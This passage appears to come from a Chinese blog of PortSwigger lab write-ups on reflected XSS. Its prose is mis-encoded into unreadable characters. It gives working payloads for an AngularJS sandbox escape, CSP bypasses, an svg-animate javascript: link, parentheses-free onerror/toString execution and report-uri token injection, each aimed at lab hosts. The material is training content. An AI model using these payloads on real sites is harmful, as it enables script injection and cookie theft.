</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query[</span><span>key</span><span style=color:#eceff4>] </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'123'</span><span style=color:#eceff4>;
</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>value </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>$parse</span><span style=color:#eceff4>(</span><span>key</span><span style=color:#eceff4>)(</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query);
</span><span style=color:#eceff4>});</span><span style=color:#81a1c1>&LT/script>
</span><span style=color:#81a1c1>&LTh1 </span><span style=color:#8fbcbb>ng-controller</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>vulnCtrl</span><span style=color:#81a1c1>></span><span style=color:#eceff4>0 search results for {{value}}</span><span style=color:#81a1c1>&LT/h1>
</span></code></pre><p>$scope ç”¨äºè§„èŒƒå½“å‰ä½œç”¨åŸŸï¼ˆæ²¡æœåˆ° åº”è¯¥æ˜¯å’Œè¿™ä¸ªcontrollerç›¸å…³çš„<p><a href=https://docs.angularjs.org/api/ng/service/$parse>$parse</a> çš„åŠŸèƒ½æ˜¯å°† AngularJS è¡¨è¾¾å¼è½¬æ¢ä¸ºå‡½æ•°ã€‚ç±»ä¼¼ JS ä¸­ function constructor çš„æ„Ÿè§‰<p>é€šè¿‡åŸå‹è®¾ç½®<code>String.charAt</code>ç ´åæ²™ç®±é€»è¾‘ï¼Œç„¶åå°†æ•°ç»„ä¼ é€’ç»™ orderBy è¿‡æ»¤å™¨ã€‚å†æ¬¡ä½¿ç”¨ toString() åˆ›å»ºå­—ç¬¦ä¸²å’Œ String æ„é€ å‡½æ•°å±æ€§æ¥è®¾ç½®è¿‡æ»¤å™¨çš„å‚æ•°ï¼Œå†ä½¿ç”¨<code>fromCharCode</code>æ–¹æ³•é€šè¿‡å°†å­—ç¬¦ä»£ç è½¬æ¢ä¸ºå­—ç¬¦ä¸²<code>x=alert(1)</code>æ¥ç”Ÿæˆ payloadã€‚<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>?</span><span>search</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>1</span><span style=color:#81a1c1>&</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>constructor</span><span style=color:#81a1c1>.</span><span>prototype</span><span style=color:#81a1c1>.</span><span>charAt</span><span style=color:#81a1c1>%</span><span>3d[]</span><span style=color:#81a1c1>.</span><span>join;[</span><span style=color:#b48ead>1</span><span>]</span><span style=color:#81a1c1>|</span><span>orderBy</span><span style=color:#81a1c1>:</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>constructor</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>fromCharCode</span><span>(</span><span style=color:#b48ead>120</span><span style=color:#eceff4>,</span><span style=color:#b48ead>61</span><span style=color:#eceff4>,</span><span style=color:#b48ead>97</span><span style=color:#eceff4>,</span><span style=color:#b48ead>108</span><span style=color:#eceff4>,</span><span style=color:#b48ead>101</span><span style=color:#eceff4>,</span><span style=color:#b48ead>114</span><span style=color:#eceff4>,</span><span style=color:#b48ead>116</span><span style=color:#eceff4>,</span><span style=color:#b48ead>40</span><span style=color:#eceff4>,</span><span style=color:#b48ead>49</span><span style=color:#eceff4>,</span><span style=color:#b48ead>41</span><span>)</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>1
</span></code></pre><p><del>æœ‰ç‚¹éš¾ã€ä¹Ÿè®¸åº”è¯¥å…ˆè¯»ä¸€è¯» AngularJS æºç </del><h2 id=lab-reflected-xss-with-angularjs-sandbox-escape-and-csp>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with AngularJS sandbox escape and CSP</h2><pre class=language-htaccess data-lang=htaccess style=color:#d8dee9;background-color:#2e3440><code class=language-htaccess data-lang=htaccess><span>Content-Security-Policy: 
</span><span>default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
</span></code></pre><p>script æŒ‡å®šäº†ä»…åŒæº<p>é¢˜è§£é€šè¿‡ hash è§¦å‘ AngularJS ä¸­çš„<code>ng-focus</code>ã€‚payloadä¸­å†’å·è¡¨ç¤ºæ­£åœ¨å‘é€åˆ°è¿‡æ»¤å™¨çš„å‚æ•°ã€‚åœ¨å‚æ•°ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰ç›´æ¥è°ƒç”¨è­¦æŠ¥å‡½æ•°ï¼Œè€Œæ˜¯å°†å…¶åˆ†é…ç»™å˜é‡ zã€‚ä»…å½“ orderBy æ“ä½œåˆ°è¾¾ $event.path æ•°ç»„ä¸­çš„ window å¯¹è±¡æ—¶æ‰ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥åœ¨çª—å£èŒƒå›´å†…è°ƒç”¨ï¼Œè€Œæ— éœ€æ˜¾å¼å¼•ç”¨<code>window</code>å¯¹è±¡ï¼Œä»è€Œæœ‰æ•ˆåœ°ç»•è¿‡ AngularJS çš„<code>window</code>æ£€æŸ¥ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span>location</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>href</span><span style=color:#81a1c1>=</span><span style=color:#a3be8c>"https://0a580013046fcd29842ff495005000f3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x"
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-with-event-handlers-and-href-attributes-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with event handlers and <code>href</code> attributes blocked</h2><p>é™åˆ¶äº†hrefå±æ€§ä½†æ˜¯è¦åšåˆ° Click button åˆ©ç”¨ã€‚é€šè¿‡ svg:animate è®¾ç½®é¢å¤–çš„å‚æ•°ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTsvg>&LTa>&LTanimate </span><span style=color:#8fbcbb>attributeName</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>href </span><span style=color:#8fbcbb>values</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>javascript:alert(1) </span><span style=color:#81a1c1>/>&LTtext </span><span style=color:#8fbcbb>x</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>20 </span><span style=color:#8fbcbb>y</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>20</span><span style=color:#81a1c1>></span><span style=color:#eceff4>Click me</span><span style=color:#81a1c1>&LT/text>&LT/a>
</span></code></pre><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>https://0a750087032fc49e810b346d00650005.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
</span></code></pre><h2 id=lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> in a JavaScript URL with some characters blocked</h2><p>åå°„å‹ä½†æ˜¯ä¸å†æœ‰<code>search</code>æœåŠ¡äº†ã€‚åªèƒ½é€šè¿‡<code>post</code>ç•Œé¢æ¥è¾¾æˆ<p>åç«¯ä¼šå°† GET å‚æ•°æ¸²æŸ“å‡ºä¸€ä¸ª a å…ƒç´ å‡ºæ¥ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTa </span><span style=color:#8fbcbb>href</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"javascript:fetch('/analytics', {method:'post',body:'&LTencodeURIComponent(input)>'}).finally(_ => window.location = '/')"</span><span style=color:#81a1c1>></span><span style=color:#eceff4>Back to Blog</span><span style=color:#81a1c1>&LT/a>
</span></code></pre><p>ä¸è¿‡è¿™ä¸ªç¼–ç ä¸ç”¨ç®¡ã€‚æ¯•ç«Ÿæ˜¯ javascript ä¼ªåè®®ï¼Œæå–æ—¶ä¼šè§£ç ä¸€æ¬¡ã€‚ç®€å•æµ‹è¯•å¯ä»¥çŸ¥é“blockæ‰äº†ç©ºæ ¼å’Œæ‹¬å·å’Œåˆ†å·<p>é—­åˆå‰åŠ jsonï¼Œç„¶åå°±å¯ä»¥é€šè¿‡<code>,</code>è¿ç®—ç¬¦çš„æ–¹å¼æ‰§è¡Œå¤šä¸ªè¡¨è¾¾å¼ã€‚è¦ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œåªèƒ½é€šè¿‡è¦†ç›– js runtime éšå¼æ‰§è¡Œçš„å‡½æ•°ã€é…åˆ throw error æ¥å®ç°ã€‚<p><a href=https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource/error_event>onerror</a> æ–¹æ³•ç”¨äºè‡ªå®šä¹‰é”™è¯¯å¤„ç†ï¼Œä¸<code>Error.prepareStackTrace</code>ä¸åŒçš„æ˜¯å®ƒä»…é€‚ç”¨äºæµè§ˆå™¨ã€‚å®ƒä¼¼ä¹ä¸<code>EventSource</code>çš„ onerror æœ‰åŒºåˆ«ï¼ˆï¼Ÿ<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>/</span><span>post</span><span style=color:#81a1c1>?</span><span>postId</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>5</span><span style=color:#81a1c1>&</span><span style=color:#a3be8c>'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{a:'
</span></code></pre><p>è¦†ç›–äº†<code>onerror</code>å’Œ<code>toString</code>ã€‚åœ¨è°ƒç”¨<code>window+''</code>æ—¶ä¼šéšå¼æ‰§è¡Œ<code>toString</code>ï¼Œ<code>toString</code>æ‰§è¡Œè§¦å‘æŠ¥é”™ï¼Œthrow å‡ºä¸€ä¸ª 1337 è¢«<code>onerror</code>æ¥æ”¶æˆä¸ºå‚æ•°æ‰§è¡Œã€‚è¿˜è›®ç¥å¥‡çš„u1s1<p>æ ¼å¼åŒ–åçš„ payload é•¿è¿™æ ·<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#88c0d0>fetch</span><span>(</span><span style=color:#a3be8c>'/analytics'</span><span style=color:#eceff4>, </span><span>{
</span><span>    method</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'post'</span><span style=color:#eceff4>,
</span><span>    body</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'/post?postId=5&'
</span><span>}</span><span style=color:#eceff4>, </span><span style=color:#88c0d0>x </span><span style=color:#81a1c1>= </span><span>x</span><span style=color:#81a1c1>=></span><span>{
</span><span>    </span><span style=color:#81a1c1>throw </span><span style=color:#616e88>/**/
</span><span>    </span><span style=color:#8fbcbb>EventSource</span><span style=color:#81a1c1>.</span><span>onerror </span><span style=color:#81a1c1>= </span><span>alert</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#b48ead>1337
</span><span>}
</span><span style=color:#eceff4>, </span><span>toString </span><span style=color:#81a1c1>= </span><span>x</span><span style=color:#eceff4>, </span><span>window </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>''</span><span style=color:#eceff4>, </span><span>{
</span><span>    a</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>''
</span><span>})</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>finally</span><span>(_</span><span style=color:#81a1c1>=></span><span>window</span><span style=color:#81a1c1>.</span><span>location </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'/'</span><span>)
</span></code></pre><h2 id=lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack>Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</h2><p><code>dangling markup attack</code>ç¿»è¯‘ä¸ºæ‚¬ç©ºæ ‡è®°æ”»å‡»ï¼Œå°±æ˜¯åœ¨XSSçš„åŸºç¡€ä¸Šè®¾ç½®æœªé—­åˆå¼•å·ï¼Œé€ æˆæµè§ˆå™¨è§£æé—®é¢˜ä»¥çªƒå–å…¶åçš„æ•æ„Ÿä¿¡æ¯ï¼ˆä¸€èˆ¬æ˜¯CSRF Tokenï¼‰<p>ä»¥å‰è§è¿‡ä¸€é¢˜ CTF å…³äº<code>dangling markup attack</code>ï¼Œæ˜¯åœ¨åå°è®°å½•è¾“å…¥è´¦å¯†çš„åœ°æ–¹æ•…æ„ç•™ä¸‹æ‚¬ç©ºæ ‡è®°ï¼Œç„¶åç­‰ç®¡ç†å‘˜ç™»å½•åé—­åˆä»¥çªƒå–ç®¡ç†å‘˜è´¦å¯†ã€‚è¿˜æ˜¯æ¯”è¾ƒæœ‰è¶£çš„ã€‚<p>è¿™é¢˜è¿˜æœ‰ä¸€éƒ¨åˆ†æ˜¯ CSP é—®é¢˜<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>default-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>;</span><span>object</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'none'</span><span style=color:#eceff4>; </span><span>style</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>script</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>img</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>base</span><span style=color:#81a1c1>-</span><span>uri </span><span style=color:#a3be8c>'none'</span><span style=color:#eceff4>;
</span></code></pre><p>ä¸è¿‡å¹¶æ²¡æœ‰ç”¨åˆ° bypass è€Œæ˜¯ç›´æ¥ CSRFã€‚<h2 id=lab-reflected-xss-protected-by-csp-with-csp-bypass>Lab: Reflected XSS protected by CSP, with CSP bypass</h2><p>CSP: <code>default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=</code><p>æ³¨æ„åˆ°CSPæºå¸¦äº†ä¸€ä¸ªtokenå‚æ•°ã€‚å¯ä»¥æ³¨å…¥åˆ©ç”¨<code>script-src-elem</code>æ¥å¯ç”¨å†…æ•›è„šæœ¬ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span style=color:#88c0d0>alert</span><span style=color:#eceff4>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>&LT/script></span><span style=color:#eceff4>&token=;script-src-elem 'unsafe-inline'
</span></code></pre><p><em>æ„Ÿè§‰ä¸èƒ½å« bypass ï¼Œåº”è¯¥æ˜¯ Injection</em><p>å®Œç»“å–½~</div></div></section>